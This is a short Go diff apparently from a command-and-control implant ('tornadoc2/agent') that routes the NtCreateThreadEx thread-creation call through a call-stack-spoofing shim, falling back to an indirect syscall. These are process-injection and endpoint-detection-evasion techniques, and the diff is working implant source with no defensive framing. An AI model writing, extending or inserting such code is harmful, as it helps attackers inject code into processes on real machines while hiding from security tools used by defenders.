@@ -11,6 +11,8 @@ import (
 	"sync"
 	"syscall"
 	"unsafe"
+
+	"tornadoc2/agent/internal/spoof"
 )
 
 var (
@@ -324,10 +326,21 @@ func NtCreateThreadEx(threadHandle *uintptr,
 	desiredAccess, objectAttributes, processHandle uintptr,
 	startRoutine, argument, createFlags, zeroBits uintptr,
 	stackSize, maximumStackSize, attributeList uintptr) error {
-	r1, _, _ := ntSyscall("NtCreateThreadEx",
+	args := [11]uintptr{
 		uintptr(unsafe.Pointer(threadHandle)), desiredAccess,
 		objectAttributes, processHandle, startRoutine,
 		argument, createFlags, zeroBits, stackSize,
-		maximumStackSize, attributeList)
+		maximumStackSize, attributeList,
+	}
+	// A spoofed chain needs the direct ntdll stub so the 11
+	// arguments can be forwarded verbatim; the indirect-syscall
+	// trampoline takes the SSN in a register the shim cannot set.
+	if spoof.Available() {
+		if proc := ntdll.NewProc("NtCreateThreadEx"); proc.Find() == nil {
+			return status("NtCreateThreadEx",
+				spoof.Call11(proc.Addr(), args))
+		}
+	}
+	r1, _, _ := ntSyscall("NtCreateThreadEx", args[:]...)
 	return status("NtCreateThreadEx", r1)
 }
